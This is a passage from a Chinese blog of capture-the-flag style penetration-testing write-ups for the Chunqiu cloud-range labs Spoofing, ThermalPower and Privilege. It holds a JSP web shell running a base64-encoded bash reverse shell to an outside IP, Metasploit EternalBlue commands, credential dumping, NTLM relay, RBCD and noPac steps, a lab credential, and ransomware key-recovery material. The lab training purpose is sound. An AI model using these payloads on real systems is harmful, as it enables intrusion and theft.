class="line">&lt;web-app&gt;</span><br><span class="line">  &lt;display-name&gt;Archetype Created Web Application&lt;/display-name&gt;</span><br><span class="line"></span><br><span class="line">  &lt;security-constraint&gt;</span><br><span class="line">    &lt;display-name&gt;Tomcat Server Configuration Security Constraint&lt;/display-name&gt;</span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line">      &lt;web-resource-name&gt;Protected Area&lt;/web-resource-name&gt;</span><br><span class="line">      &lt;url-pattern&gt;/upload/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line">      &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line">  &lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;404&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/404.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;error-code&gt;403&lt;/error-code&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;error-page&gt;</span><br><span class="line">    &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;</span><br><span class="line">    &lt;location&gt;/error.html&lt;/location&gt;</span><br><span class="line">  &lt;/error-page&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.HelloServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;HelloServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/HelloServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;LoginServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.LoginServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;LoginServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/LoginServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;RegisterServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.RegisterServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;RegisterServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/RegisterServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;UploadTestServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.UploadTestServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;UploadTestServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/UploadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">  &lt;servlet&gt;</span><br><span class="line">    &lt;display-name&gt;DownloadFileServlet&lt;/display-name&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.example.DownloadFileServlet&lt;/servlet-class&gt;</span><br><span class="line">  &lt;/servlet&gt;</span><br><span class="line">  &lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;DownloadFileServlet&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/DownloadServlet&lt;/url-pattern&gt;</span><br><span class="line">  &lt;/servlet-mapping&gt;</span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>看到/UploadServlet文件上传路由，上传恶意脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82MC4yMDQuMjQ1LjM3LzIzMzMzIDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;).getInputStream();</span><br><span class="line">    int a = -1;</span><br><span class="line">    byte[] b = new byte[2048];</span><br><span class="line">    out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">    while((a=in.read(b))!=-1)&#123;</span><br><span class="line">        out.println(new String(b));</span><br><span class="line">    &#125;</span><br><span class="line">    out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754366845596-2a887822-f388-4d2a-b7fe-8de07a3e10c2.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>执行脚本弹shell</p><figure><imgsrc="/images/春秋云境-Spoofing/1754366881281-59faddf6-d438-4db8-9cd9-b3e256fc0700.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754366894337-73ed3644-6001-42c0-b21d-afca1d6f9258.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754366970749-b1b3081b-9ae7-4d4b-a5f2-f9d4f39df840.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写个公钥进去然后ssh连上，扫内网</p><figure><imgsrc="/images/春秋云境-Spoofing/1754374163327-97fe5631-9891-4f8a-866c-58974442e69f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-Spoofing/1754374397281-e04af31b-39af-4570-90c0-fbcd6321e47a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754374408994-f676b16e-c7d4-4484-b2b6-baba0781f6c4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>先打扫到的永恒之蓝</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/windows/smb/ms17_010_eternalblue</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid</span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.22.11.45</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754374649651-ff10aef4-a70e-42c8-af8b-44aee9dcb877.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754375011801-93a359a8-5003-4107-9058-eb1344b70024.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>抓一下域账户哈希</p><figure><imgsrc="/images/春秋云境-Spoofing/1754399835237-720a7bc4-91df-457e-8d2b-0bdf62837fef.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看了大佬的博客，接下来的大致思路是通过petitpotam触发存在漏洞且开启了webclient的目标携带ntlm认证访问我们的中继服务，用这个认证打NTLMRelay通过ldap获取到机器账户身份，修改自己的msDS-AllowedToActOnBehalfOfOtherIdentity属性，然后打RBCD</p><p>扫到开启了webclient的主机</p><p>这里不知道为什么petitpotam扫不出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav</span><br></pre></td></tr></table></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754376518030-54de171b-f410-4cc8-b2d1-3efd1d5db254.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>做流量转发，将服务器端口的流量转发到本地的端口</p><figure><imgsrc="/images/春秋云境-Spoofing/1754388220225-17785522-28bf-4866-bfc9-607d682a5346.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>测试成功</p><figure><imgsrc="/images/春秋云境-Spoofing/1754388310237-360609a2-7651-4d01-b290-4d384e1378f0.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>本地开启ntlmrelayx</p><figure><imgsrc="/images/春秋云境-Spoofing/1754388816941-e737676f-02d7-4fe5-a7f3-a22d5b81f30b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>使用petitpotam触发认证</p><figure><imgsrc="/images/春秋云境-Spoofing/1754399536705-8bb96482-9ffa-4e8d-93ad-6045cfa83ed8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754399553932-21cebef1-f970-42dc-ad5b-f54c2f73ff1c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用之前mimikatz抓的机器账户与其对应哈希打RBCD</p><p>获取ST</p><figure><imgsrc="/images/春秋云境-Spoofing/1754399934785-7169881a-7801-4fc5-b14a-1d70ec02241d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打ptt，拿flag</p><figure><imgsrc="/images/春秋云境-Spoofing/1754400041354-86a27828-2741-47a6-9fdb-26356ad9a0d8.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754400086608-29034d3b-e719-44d5-b1d7-6a0636790f57.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写个管理员账户进去</p><figure><imgsrc="/images/春秋云境-Spoofing/1754400795380-f00126dc-706d-4007-93e3-d32d8b12aa80.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>rdp连上，传mimikatz上去抓哈希，抓到一个叫zhanghui的用户</p><figure><imgsrc="/images/春秋云境-Spoofing/1754401472483-ad8253e9-7f10-4f0f-afc0-b11dbdee740a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据hint要打noPac，而zhanghui这个用户正好在MA_Admin组内</p><figure><imgsrc="/images/春秋云境-Spoofing/1754401454998-04db4c7c-6e74-43f8-b468-a589ce0f8d09.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>打noPac，拿flag</p><figure><imgsrc="/images/春秋云境-Spoofing/1754401632444-c8916a9a-6547-477a-b439-cb8c3cbe5278.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Spoofing/1754401664959-2aeebf52-a2ea-47ba-9e4a-bacf7eb13887.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境 ThermalPower</title>
      <link href="/posts/e20feabc/"/>
      <url>/posts/e20feabc/</url>
      
        <content type="html"><![CDATA[<p>上fscan扫一遍，存在heapdump泄露</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754226729135-c096061e-13d7-4d37-b907-b1b58f3bae8d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用JDumpSpider找到shiro key</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754226875816-4187d2c4-5209-4c0c-953b-32d899650df4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>shiroattack，得到第一个flag</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754226946481-b0543929-842f-4ae3-bb0c-3fb45dc525cd.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-ThermalPower/1754226982841-5a8e8366-ff4a-41e5-8fae-ab5b822bd521.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>写蚁剑的内存马进去</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754227176416-ab024fdf-fd56-4203-b5e2-f331d01c4d4b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-ThermalPower/1754227317784-afa5b27c-3b9b-40ff-901a-2b41235f3b04.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>直接就是root权限</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754227342532-95510758-d55b-42cb-831e-23f71783a577.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>扫内网</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754227427822-bbe54190-eef3-41ae-9af9-d40d49b641cb.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>搭建frp</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754227571804-6786f581-3f60-48b9-a9c3-b27851946ae5.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>有个匿名ftp，不知道为什么连不上，但是http访问过去是一样的</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754228466432-bf628e52-ec42-42c7-8ba8-d2c070a9dec7.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>找到一个账密和一个新的网段</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754228499210-5a864121-aa1f-4976-a1d0-47be7ca05c9d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>扫一下新网段</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754228633816-bdca48d5-6602-4ab2-b1cb-e3194e017953.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>rdp连上去，根据hint点一下锅炉开就有flag了</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754228893075-d0f4783a-5b02-44c2-9d3d-97bc52a96179.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-ThermalPower/1754228800158-e21e04d0-1be9-45b8-8700-a2941ad36d31.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>win+d返回桌面，一副被勒索了的样子。</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754277152306-780e2b67-6ed6-4bb8-8251-44b51a6400cf.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>找到勒索软件C:.exe，拿出来做逆向</p><p>查壳，.NET架构</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754277309482-aff44c74-e6b2-40e2-83af-df6e86e94f15.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用dnspy看下，找到关键代码</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754277539874-fc0df04a-2328-4d9d-b9c4-29ed5970adaf.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>题目描述中给出了privateKey和encryptedAesKey</p><p>privatekey如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RSAKeyValue</span>&gt;</span><span class="tag">&lt;<span class="name">Modulus</span>&gt;</span>uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=<span class="tag">&lt;/<span class="name">Modulus</span>&gt;</span><span class="tag">&lt;<span class="name">Exponent</span>&gt;</span>AQAB<span class="tag">&lt;/<span class="name">Exponent</span>&gt;</span><span class="tag">&lt;<span class="name">P</span>&gt;</span>2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==<span class="tag">&lt;/<span class="name">P</span>&gt;</span><span class="tag">&lt;<span class="name">Q</span>&gt;</span>2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==<span class="tag">&lt;/<span class="name">Q</span>&gt;</span><span class="tag">&lt;<span class="name">DP</span>&gt;</span>ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==<span class="tag">&lt;/<span class="name">DP</span>&gt;</span><span class="tag">&lt;<span class="name">DQ</span>&gt;</span>PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==<span class="tag">&lt;/<span class="name">DQ</span>&gt;</span><span class="tag">&lt;<span class="name">InverseQ</span>&gt;</span>JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==<span class="tag">&lt;/<span class="name">InverseQ</span>&gt;</span><span class="tag">&lt;<span class="name">D</span>&gt;</span>tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=<span class="tag">&lt;/<span class="name">D</span>&gt;</span><span class="tag">&lt;/<span class="name">RSAKeyValue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用在线工具将其转换为pem格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXQIBAAKBgQC6gvYIBpW0xWntvj8h9x7HYCu267a2+0E7bkl0zACd67qAQ8Kt</span><br><span class="line">C8PKzB5tyEDUudXd744lXmQfEVOn92IjNKeaeFSZ9mNiuyFlIsabV9PBxGsvphhW</span><br><span class="line">x9Vkb/hQtINRF8CKHI3Ucgs/9aoKq67WhajQJ3GjAyxmkwM+h2rMdwULEQIDAQAB</span><br><span class="line">AoGBALbiyevOwSeUWK2mWnOsxUKNe/APLIg60Zk8KM1daNFxn9w8FX3nxmJqSwAt</span><br><span class="line">V90AKMVKLKFZ8GVCcTyH6HRLIng6MUalcTAnCmySt58DHQCqL+gacRlJaAC5cU4u</span><br><span class="line">jiJk+sP66E1vTiur5ReeKOVP+A50DVDOrLP9vwjDPxIDPb89AkEA2RPqaofcJ/ph</span><br><span class="line">Ip3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+</span><br><span class="line">fqwWfUEmFwJBANv0BoCKaqcTg2iS0L40vMZ1PDb8TJZNddC0lJ3wIfxOsAf11HPP</span><br><span class="line">R4VjKoeLBqPywF9J/eHXGeLyzKc25FX8uRcCQQC6UrnWjp6NQf+18rbzUDtOCo1O</span><br><span class="line">+Yft9StrR0VH4ocJkWZq/17+drRD/8WK9N4LogC03l4syQrANJHWsGbtQ8opAkA8</span><br><span class="line">7YnnjXAhu+wIybJ9Hcq1BsCZUqY8dFSQbZVFcsFXTMzCR7yEIATl1CRxy3cZbyMO</span><br><span class="line">wkZLivQmw68hGrmBgDIdAkAlLa20HRYmbbbemWElCtapK+z0t0R5N3xyA1ajJOQw</span><br><span class="line">6RgiJ5FNGSj9G5e5+DGmmXhsv1FFMjx7y2Qeg/M0srhs</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>encryptedAesKey如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=</span><br></pre></td></tr></table></figure><p>用在线工具对其解密</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754278777951-751af62a-2a7b-48cc-bf01-1f4d80fd493a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>提取被加密文件的前16位作为iv</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754279073875-85d78e49-6962-48d1-b846-06c260a65877.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>AES解密</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754279207080-1a9073da-f3ae-496b-ad33-8264ce3d1b63.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在其中找到flag</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754279316274-3458ffc5-d5f8-4ede-a30b-d960c15ae93f.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>在之前的ftp服务器中还有一个通知和通讯录</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754292795825-2e1f6191-83c9-4896-8e3e-e476125c5395.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>通知中如是说</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754292803721-a052c004-678f-4816-8692-2fe36cc5b47c.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>从通讯录中随便找个工程师的号rdp登上去看看，然后查看一下用户权限。记得接下来要用管理员身份运行cmd和powershell。</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754292811967-b3fcf9d2-d2de-4af7-8c00-f7fe7d88c995.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>可以看到用户在BackupOperators组内，有SeBackupPrivilege权限（看网上有很多师傅说看不到这个权限，其实就是没有以管理员身份运行cmd和powershell），接下来就可以利用这个权限提权</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754292831030-fc8ce739-2d51-457a-8417-26bc0eb23fda.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>用这个工具https://github.com/k4sth4/SeBackupPrivilege提权</p><figure><imgsrc="/images/春秋云境-ThermalPower/1754292838081-aaab582e-7ec9-4a77-8d6f-2108ee923712.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-ThermalPower/1754292847171-dd6aee17-e459-4602-a192-2134a805aaaa.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
          <category> 春秋云境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 春秋云境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云境-Privilege</title>
      <link href="/posts/cb0f9c73/"/>
      <url>/posts/cb0f9c73/</url>
      
        <content type="html"><![CDATA[<p>先上fscan扫一波，扫到www.zip</p><figure><imgsrc="/images/春秋云境-Privilege/1754190055042-e79c2de3-5be0-4953-8dcf-caf301d57e0d.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>下载下来审计源码，发现存在任意文件读取</p><figure><imgsrc="/images/春秋云境-Privilege/1754190277429-a811b14b-79a9-410e-9e7e-18b89b26d139.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据题目给出的hint读取flag</p><figure><imgsrc="/images/春秋云境-Privilege/1754190428613-724b7f35-7240-41b1-a2a2-df2b8cbfe2cf.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Privilege/1754190597405-4c90174e-2ad5-4eaf-a737-bc3428c2aa54.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>根据前面的hint读取服务器初始密码</p><figure><imgsrc="/images/春秋云境-Privilege/1754190690119-d2740d8e-3bad-4626-ba6d-4c439d9cc261.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>登录Jenkins的后台</p><figure><imgsrc="/images/春秋云境-Privilege/1754190792835-16b45975-314e-4f57-b2aa-4636813ca220.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>Manage Jenkins -&gt; Script Console执行命令</p><p>添加一个管理员用户</p><figure><imgsrc="/images/春秋云境-Privilege/1754191240330-c92e26f9-f42b-4c26-83da-537066d48279.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>传个fscan上去扫一下，除本机外还有四台机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\st4rr\Desktop&gt;fscan.exe -h 172.22.14.7/24</span><br><span class="line"></span><br><span class="line">   ___                              _</span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __</span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\</span><br><span class="line">                     fscan version: 1.8.4</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.14.7     is alive</span><br><span class="line">(icmp) Target 172.22.14.11    is alive</span><br><span class="line">(icmp) Target 172.22.14.16    is alive</span><br><span class="line">(icmp) Target 172.22.14.31    is alive</span><br><span class="line">(icmp) Target 172.22.14.46    is alive</span><br><span class="line">[*] Icmp alive hosts len is: 5</span><br><span class="line">172.22.14.31:139 open</span><br><span class="line">172.22.14.46:445 open</span><br><span class="line">172.22.14.31:445 open</span><br><span class="line">172.22.14.11:445 open</span><br><span class="line">172.22.14.7:445 open</span><br><span class="line">172.22.14.46:139 open</span><br><span class="line">172.22.14.11:139 open</span><br><span class="line">172.22.14.46:135 open</span><br><span class="line">172.22.14.31:135 open</span><br><span class="line">172.22.14.7:139 open</span><br><span class="line">172.22.14.11:135 open</span><br><span class="line">172.22.14.7:135 open</span><br><span class="line">172.22.14.46:80 open</span><br><span class="line">172.22.14.16:80 open</span><br><span class="line">172.22.14.7:80 open</span><br><span class="line">172.22.14.16:22 open</span><br><span class="line">172.22.14.7:8080 open</span><br><span class="line">172.22.14.16:8060 open</span><br><span class="line">172.22.14.31:1521 open</span><br><span class="line">172.22.14.7:3306 open</span><br><span class="line">172.22.14.11:88 open</span><br><span class="line">172.22.14.16:9094 open</span><br><span class="line">[*] alive ports len is: 22</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.7</span><br><span class="line">   [-&gt;]XR-JENKINS</span><br><span class="line">   [-&gt;]172.22.14.7</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.11</span><br><span class="line">   [-&gt;]XR-DC</span><br><span class="line">   [-&gt;]172.22.14.11</span><br><span class="line">[*] WebTitle http://172.22.14.7:8080 